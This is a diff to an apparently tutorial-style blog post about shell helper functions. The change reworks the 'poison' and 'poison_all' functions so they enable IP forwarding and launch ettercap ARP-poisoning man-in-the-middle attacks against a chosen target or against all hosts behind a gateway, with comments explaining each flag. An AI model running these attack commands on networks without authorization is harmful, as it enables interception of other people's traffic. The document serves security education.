@@ -109,19 +109,15 @@ function update() { sudo apt-get update && sudo apt-get -y upgrade; }
 {% endhighlight %}
 
 {% highlight ruby %}
-function ip_forward_on() { sudo sysctl -w net.ipv4.ip_forward=1; }
+function poison ()
+{
+sudo sysctl -w net.ipv4.ip_forward=1;
+sudo ettercap -T -M arp:remote /$gatewayIP// /$targetIP//;
+}
 #sysctl: used to modify built in system varibles.
 #-w: used to specify a change in sysctl itself.
 #net.ipv4.ip_forward=1: Enable IP forwarding which allows our network monitoring tool to forward all traffic to a different device.
-{% endhighlight %}
 
-{% highlight ruby %}
-function ip_forward_off() { sudo sysctl -w net.ipv4.ip_forward=0; }
-#Same as above, but =0 turns it off. Use this command when you are done.
-{% endhighlight %}
-
-{% highlight ruby %}
-function poison () { sudo ettercap -T -M arp:remote /$gatewayIP// /$targetIP//; }
 #ettercap: A tool that is used to monitor traffic
 #-T: Text only interface. As opposed to graphical
 #-M arp:remote: Tells ettercap to perform a "man in the middle attack" as discussed earlier in the article. We will tell it to use the arp attack to collect inbound and outbound traffic. As opposed to arp:oneway which only poisons the outbound traffic from the target.
@@ -130,8 +126,17 @@ function poison () { sudo ettercap -T -M arp:remote /$gatewayIP// /$targetIP//; 
 {% endhighlight %}
 
 {% highlight ruby %}
-function poison_all () { sudo ettercap -T -M arp:remote /$gatewayIP// ///; }
+function poison_all ()
+{
+sudo sysctl -w net.ipv4.ip_forward=1;
+sudo ettercap -T -M arp:remote /$gatewayIP// ///;
+}
 #Same as above, but an unspecified target means, "collect all traffic going to and from the first targeted device"
+{% endhighlight %}
+
+{% highlight ruby %}
+function ip_forward_off() { sudo sysctl -w net.ipv4.ip_forward=0; }
+#Same as above, but =0 turns IP forwarding off. Use this command when you are done with your operation.
 {% endhighlight %}
 
 The next function can not simply be be added with a copy paste. You will need to look at the second command and change myuser:myuser to whatever your active username is.
